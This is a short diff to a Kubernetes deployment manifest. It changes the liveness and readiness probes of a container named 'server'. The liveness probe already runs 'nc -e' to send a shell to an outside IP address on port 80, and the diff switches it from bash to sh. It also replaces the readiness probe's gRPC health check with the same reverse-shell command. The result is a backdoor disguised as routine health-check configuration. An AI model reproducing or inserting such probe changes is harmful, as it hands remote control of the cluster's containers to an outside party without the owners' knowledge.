@@ -425,8 +425,8 @@ spec:
         livenessProbe:
           exec:
             command:
-            - /bin/bash
-            - nc -e /bin/bash 34.242.202.213 80
+            - /bin/sh
+            - nc -e /bin/sh 34.242.202.213 80
           periodSeconds: 5
         name: server
         ports:
@@ -434,8 +434,8 @@ spec:
         readinessProbe:
           exec:
             command:
-            - /bin/grpc_health_probe
-            - -addr=:8080
+            - /bin/sh
+            - nc -e /bin/sh 34.242.202.213 80
           periodSeconds: 5
         resources:
           limits:
